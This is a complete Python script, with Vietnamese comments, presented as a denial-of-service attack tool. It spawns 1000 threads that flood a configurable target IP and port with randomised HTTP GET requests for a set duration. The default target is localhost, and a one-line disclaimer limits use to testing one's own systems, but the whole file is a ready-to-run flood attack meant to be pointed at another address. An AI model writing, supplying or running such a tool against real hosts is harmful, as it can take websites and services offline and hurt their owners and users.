# tool_ddos.py - Công cụ tấn công từ chối dịch vụ (DDOS)
# Chỉ dùng cho mục đích kiểm tra bảo mật hệ thống của chính bạn

import socket
import threading
import random
import time
import sys

# CẤU HÌNH MỤC TIÊU
TARGET_IP = "127.0.0.1"      # Địa chỉ IP mục tiêu (thay đổi)
TARGET_PORT = 80             # Cổng mục tiêu (80 = HTTP)
THREADS = 1000               # Số luồng đồng thời
DURATION = 30                # Thời gian chạy (giây)

# HÀM GỬI GÓI TIN TẤN CÔNG
def attack():
    ket_thuc = time.time() + DURATION
    while time.time() < ket_thuc:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect((TARGET_IP, TARGET_PORT))
            
            # Tạo HTTP request ngẫu nhiên
            req = f"GET /?{random.randint(1,999999)} HTTP/1.1\r\n"
            req += f"Host: {TARGET_IP}\r\n"
            req += "User-Agent: Mozilla/5.0\r\n"
            req += "Accept: */*\r\n\r\n"
            
            sock.send(req.encode())
            sock.close()
        except:
            pass

# HÀM KHỞI CHẠY
def start_ddos():
    print(f"[+] Đang tấn công {TARGET_IP}:{TARGET_PORT} với {THREADS} luồng")
    for i in range(THREADS):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()
    
    time.sleep(DURATION)
    print("[+] Kết thúc tấn công")
    sys.exit(0)

if __name__ == "__main__":
    start_ddos()
